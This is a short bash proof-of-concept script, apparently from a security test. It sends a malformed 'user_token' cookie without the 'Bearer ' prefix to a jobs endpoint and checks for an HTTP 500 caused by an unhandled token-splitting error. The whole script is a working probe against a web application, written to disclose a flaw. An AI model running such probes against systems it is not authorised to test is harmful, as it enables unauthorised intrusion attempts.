#!/bin/bash

# POC: Improper Error Handling - Unvalidated Token Format Causes 500 Error
# This script demonstrates how malformed tokens without "Bearer " prefix
# cause a 500 Internal Server Error due to improper exception handling

TARGET_URL="${1:-http://localhost:8080}"
COMPANY_ID="1"

echo "============================================"
echo "POC: Improper Error Handling - Token Format"
echo "============================================"
echo ""

# Test 1: Send malformed token (just base64 without "Bearer " prefix)
echo "[*] Test 1: Sending malformed token (base64 only, no 'Bearer' prefix)"
echo "    Token: MQ== (just the base64 without 'Bearer ')"
echo "    Endpoint: $TARGET_URL/company/$COMPANY_ID/jobs"
echo ""

RESPONSE=$(curl -s -w "\n%{http_code}" -b "user_token=MQ==" "$TARGET_URL/company/$COMPANY_ID/jobs")
HTTP_CODE=$(echo "$RESPONSE" | tail -n1)
BODY=$(echo "$RESPONSE" | sed '$d')

echo "[*] Response Status Code: $HTTP_CODE"
echo "[*] Response Body (first 500 chars):"
echo "$BODY" | head -c 500
echo ""
echo ""

# Check if we got a 500 error (vulnerability confirmed)
if [ "$HTTP_CODE" = "500" ]; then
    echo "[✓] VULNERABILITY CONFIRMED: Got HTTP 500 error"
    echo "    This indicates improper error handling in token validation"
    echo "    The IndexError from token.split(' ')[1] is not properly caught"
    exit 0
else
    echo "[!] Did not receive expected 500 error"
    echo "    Received: HTTP $HTTP_CODE"
    exit 1
fi